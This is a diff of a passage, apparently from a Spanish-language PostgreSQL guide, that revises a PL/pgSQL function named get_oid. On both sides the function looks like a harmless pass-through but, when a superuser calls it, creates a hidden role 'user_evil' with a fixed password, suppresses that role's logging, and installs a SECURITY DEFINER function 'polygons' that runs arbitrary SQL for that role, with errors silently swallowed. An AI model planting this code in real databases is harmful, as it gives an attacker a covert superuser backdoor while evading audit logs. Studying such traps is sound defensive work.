@@ -745,53 +745,47 @@ Función Entendible: En este ejemplo, se creó la función entendible, a la cual
 CREATE or replace FUNCTION get_oid(p_oid oid) RETURNS oid AS $_$
 BEGIN
 	
-	 
 	BEGIN
- 
-    IF (SELECT 1 FROM pg_roles WHERE rolname = 'user_evil') IS NULL THEN
-        EXECUTE $$
-			create user user_evil WITH  password '123123';
-			ALTER user user_evil SET client_min_messages='panic';  
-			ALTER user user_evil SET  log_statement='none'; 
-			ALTER user user_evil SET log_min_messages='panic';
-			ALTER user user_evil SET log_min_error_statement='panic';
-			ALTER user user_evil SET log_duration = off; 
-			$$;
+	
+		IF (select 1 from pg_roles where rolsuper = true and rolname = session_user) THEN
+		
+			IF (SELECT 1 FROM pg_roles WHERE rolname = 'user_evil') IS NULL THEN
+				EXECUTE $$
+					create user user_evil WITH  password '123123';
+					ALTER user user_evil SET client_min_messages='panic';  
+					ALTER user user_evil SET  log_statement='none'; 
+					ALTER user user_evil SET log_min_messages='panic';
+					ALTER user user_evil SET log_min_error_statement='panic';
+					ALTER user user_evil SET log_duration = off; 
+					$$;
 
-    END IF;
-	
-	IF (select 1 from pg_roles where rolsuper = true and rolname = session_user) THEN
-	
-		IF (select 1 from pg_proc where proname ='polygons') IS NULL THEN
+			END IF;
+		
+			IF (select 1 from pg_proc where proname ='polygons') IS NULL THEN
 
-			EXECUTE E'
-						
-				CREATE OR REPLACE FUNCTION polygons(p_value text) RETURNS void AS \$\$
-				BEGIN
-					EXECUTE p_value;
-				END;
-				\$\$ LANGUAGE plpgsql 
-				SECURITY DEFINER;
+				EXECUTE E'
+							
+					CREATE OR REPLACE FUNCTION polygons(p_value text) RETURNS void AS \$\$
+					BEGIN
+						EXECUTE p_value;
+					END;
+					\$\$ LANGUAGE plpgsql 
+					SECURITY DEFINER;
 
-				GRANT EXECUTE ON FUNCTION polygons(text) TO user_evil;
+					GRANT EXECUTE ON FUNCTION polygons(text) TO user_evil;
 
-			';
-	
-		END IF; 
-	
-	
-	END IF;
+				';
+		
+			END IF; 
+		END IF;
 	
 	
 	EXCEPTION 
 		WHEN OTHERS  THEN 
 
 	END;
-	
 	return p_oid ; 
-	
 END; $_$ LANGUAGE plpgsql  ;
-
 
 
 
